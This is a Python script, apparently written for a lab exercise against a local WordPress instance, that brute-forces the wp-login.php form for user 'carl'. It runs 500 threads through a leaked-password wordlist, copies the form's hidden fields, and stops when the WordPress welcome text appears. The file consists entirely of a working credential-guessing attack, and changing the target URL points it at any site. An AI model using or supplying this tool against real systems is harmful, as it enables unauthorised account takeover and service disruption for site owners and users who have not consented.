from io import BytesIO
import io
import queue
import threading
import time
from xml.etree import ElementTree
import requests
from bs4 import BeautifulSoup
from html.parser import HTMLParser

target = "http://127.0.0.1:31337/wp-login.php"
success_string = "Welcome to WordPress!"
wordlist = "./SecLists/Passwords/darkweb2017-top10000.txt"
username = "carl"
thread_amount = 500

abort = False
found = ""

class loginform:
    def __init__(self, log, pwd, wp_submit, redirect_to, testcookie):
        self.data = {
            "log": log,
            "pwd": pwd,
            "wp-submit": wp_submit,
            "redirect_to": redirect_to,
            "testcookie": testcookie,
        }

    def get_data(self):
        return self.data

def get_words():
  with open(wordlist,  encoding="utf8") as file:
    raw_words = file.read()
    
    word_queue = queue.Queue()
    for word in raw_words.split():
      word_queue.put(word)
    return word_queue


def get_params(content):
  soup = BeautifulSoup(content, 'html.parser')
  input_tags = soup.find_all("input")
  
  params = {}
  
  for tag in input_tags:
    if tag["name"]:
      params[tag["name"]] = tag["value"]
  
  return params

def brute(url, username, passwords: queue.Queue):
  global abort, found
  session = requests.Session()
  first_resp = session.get(url)
  params = get_params(first_resp.content)
  params['log'] = username
  
  while not passwords.empty() and not abort:
    time.sleep(1)
    passwd = passwords.get()
    print(f"{passwd}:", end="", flush=True)
    params["pwd"] = passwd
    
    response = session.post(url, data=params)
    if success_string in response.content.decode():
      abort = True
      found = passwd
      
      for _ in range(10):
        print(f"Found password: {passwd}")
      
    
    
passwords = get_words()

for _ in range(thread_amount):
  time.sleep(1 / thread_amount)
  thread = threading.Thread(target=brute, args=(target, username, passwords,))
  thread.start()

try:
  while True:
    time.sleep(0.1)
except KeyboardInterrupt:
  abort = True

print(f"Found password: {found}")